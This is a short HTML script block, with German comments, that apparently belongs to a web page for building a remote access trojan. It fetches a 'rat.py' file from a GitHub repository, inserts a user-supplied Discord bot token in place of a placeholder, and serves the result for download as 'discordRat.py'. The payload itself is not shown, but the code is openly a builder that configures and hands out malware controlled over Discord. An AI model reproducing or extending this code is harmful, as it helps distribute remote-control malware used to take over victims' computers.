<script>
    async function getRatFile(botToken) {
        if(botToken) {

            try {
                // URL der Datei auf GitHub
                const url = 'https://raw.githubusercontent.com/PrimeMarket/discordRatFile/main/rat.py';
                // Datei von GitHub abrufen
                const response = await fetch(url);
                if (!response.ok) throw new Error('Network response was not ok');
                let text = await response.text();
                // Wort ersetzen
                const originalWord = 'BOT_TOKEN';
                const newWord = botToken;
                const modifiedText = text.replace(new RegExp(originalWord, 'g'), newWord);
                // Blob-Datei erstellen
                const blob = new Blob([modifiedText], { type: 'text/plain' });
                const urlBlob = URL.createObjectURL(blob);
                // Download-Link erstellen
                let a = document.createElement('a');
                a.href = urlBlob;
                a.download = 'discordRat.py';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                // URL wieder freigeben
                URL.revokeObjectURL(urlBlob);


            } catch (error) {
                console.error('Error fetching or modifying the file:', error);
            }
        } else {
            alert("Wrong Bot Token");
        }
    }

    function downloadRatSetupFile() {
        document.getElementById('setupFile').click();
    }
</script>
